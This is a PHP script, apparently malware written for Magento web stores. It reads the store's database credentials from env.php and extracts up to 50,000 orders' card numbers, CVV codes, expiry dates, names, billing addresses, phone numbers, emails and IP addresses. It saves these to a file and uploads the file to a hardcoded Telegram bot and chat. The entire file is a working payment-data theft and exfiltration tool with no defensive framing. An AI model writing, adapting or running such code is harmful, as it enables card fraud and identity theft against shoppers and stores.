<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('memory_limit', '512M');

echo "Starting Deep Scan Decrypt Script...\n";

// CONFIGURATION
$tg_bot_token = '8693989214:AAEKf5lK8DyTBEUAq7M3B6ROydPcaOIyrg4';
$tg_chat_id = '7441100556';

// TELEGRAM FUNCTION
function send_telegram($msg, $file_path = null) {
    global $tg_bot_token, $tg_chat_id;
    if ($tg_bot_token === 'ENTER_BOT_TOKEN_HERE' || empty($tg_bot_token)) return;

    // Text
    if ($msg) {
        $url = "https://api.telegram.org/bot$tg_bot_token/sendMessage";
        $data = ['chat_id' => $tg_chat_id, 'text' => $msg, 'parse_mode' => 'HTML'];
        $options = ['http'=>['header'=>"Content-type: application/x-www-form-urlencoded\r\n",'method'=>'POST','content'=>http_build_query($data),'timeout'=>10]];
        @file_get_contents($url,false,stream_context_create($options));
    }

    // File
    if ($file_path && file_exists($file_path)) {
        $url = "https://api.telegram.org/bot$tg_bot_token/sendDocument";
        if (function_exists('curl_init')) {
            $ch = curl_init();
            $cfile = new CURLFile($file_path);
            curl_setopt_array($ch, [
                CURLOPT_URL=>$url,
                CURLOPT_POST=>1,
                CURLOPT_POSTFIELDS=>['chat_id'=>$tg_chat_id,'document'=>$cfile],
                CURLOPT_RETURNTRANSFER=>true,
                CURLOPT_SSL_VERIFYPEER=>false
            ]);
            curl_exec($ch);
            curl_close($ch);
        }
    }
}

// GET DOMAIN & FILE
$host_name = $_SERVER['HTTP_HOST'] ?? php_uname('n');
$clean_host = preg_replace('/[^a-zA-Z0-9.-]/','_',$host_name);
$outFile = __DIR__ . '/' . $clean_host . '-cc.txt';
$fp = fopen($outFile,'a+');
fwrite($fp,"--- NEW SCAN SESSION ".date('Y-m-d H:i:s')." ---\n");

// FIND env.php
function findEnvPhp() {
    $roots = [
        __DIR__.'/../../../../../../../app/etc/env.php',
        __DIR__.'/../../../../../../app/etc/env.php',
        __DIR__.'/../../../../../app/etc/env.php',
        __DIR__.'/../../../../app/etc/env.php',
        __DIR__.'/../../../app/etc/env.php',
        __DIR__.'/../../app/etc/env.php',
        __DIR__.'/../app/etc/env.php',
        __DIR__.'/app/etc/env.php',
        $_SERVER['DOCUMENT_ROOT'].'/app/etc/env.php'
    ];
    foreach ($roots as $f) if(file_exists($f)) return realpath($f);
    return null;
}

$envFile = findEnvPhp();
if(!$envFile) die("Error: env.php not found.\n");

$env = include $envFile;
$dbConf = $env['db']['connection']['default'];
$host = $dbConf['host']??'localhost';
$user = $dbConf['username']??'';
$pass = $dbConf['password']??'';
$dbname = $dbConf['dbname']??'';
$prefix = $env['db']['table_prefix']??'';

// DB CONNECT
try{
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8",$user,$pass,[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);
}catch(PDOException $e){die("DB Connection Failed: ".$e->getMessage()."\n");}

// FETCH ORDERS
$tbl_payment = $prefix.'sales_order_payment';
$tbl_order = $prefix.'sales_order';
$tbl_addr = $prefix.'sales_order_address';

$sql = "SELECT so.increment_id,so.created_at,so.customer_email,so.remote_ip,so.entity_id as parent_id,sop.* 
FROM {$tbl_payment} sop 
JOIN {$tbl_order} so ON so.entity_id = sop.parent_id 
ORDER BY so.created_at DESC LIMIT 50000";

$stmt = $pdo->query($sql);
$rows = $stmt->fetchAll();
echo "Fetched ".count($rows)." rows.\n";

// SCAN EACH ORDER
$found_count=0;
foreach($rows as $r){
    $info = [];
    if(!empty($r['additional_information'])){ $json=json_decode($r['additional_information'],true); if(is_array($json)) $info=array_merge($info,$json);}
    if(!empty($r['additional_data'])){ $json=json_decode($r['additional_data'],true); if(!$json) $json=@unserialize($r['additional_data']); if(is_array($json)) $info=array_merge($info,$json);}

    $pan=$r['cc_number']??$info['cc_number']??'';
    $cvv=$r['cc_cid']??$info['cc_cid']??'';
    $exp_m=$r['cc_exp_month']??$info['cc_exp_month']??'0';
    $exp_y=$r['cc_exp_year']??$info['cc_exp_year']??'0';

    // Billing address
    $stmt_a=$pdo->prepare("SELECT * FROM {$tbl_addr} WHERE parent_id=? AND address_type='billing'");
    $stmt_a->execute([$r['parent_id']]);
    $ba=$stmt_a->fetch()??[];

    $line = "ORDER={$r['increment_id']} | DATE={$r['created_at']} | METHOD={$r['method']} | PAN={$pan} | CVV={$cvv} | EXP={$exp_m}/{$exp_y} | NAME=".($ba['firstname']??'').' '.($ba['lastname']??'')." | ADDRESS=".str_replace(["\n","\r"],' ',(string)($ba['street']??''))." | CITY=".($ba['city']??'')." | STATE=".($ba['region']??'')." | ZIP=".($ba['postcode']??'')." | COUNTRY=".($ba['country_id']??'')." | PHONE=".($ba['telephone']??'')." | EMAIL={$r['customer_email']} | IP={$r['remote_ip']}";
    
    fwrite($fp,$line.PHP_EOL);
    $found_count++;
}

fclose($fp);
echo "DONE. Found $found_count records. Saved to $outFile\n";

// SEND TO TELEGRAM
if($found_count>0 && $tg_bot_token!=='ENTER_BOT_TOKEN_HERE'){
    send_telegram(null,$outFile);
}
?>
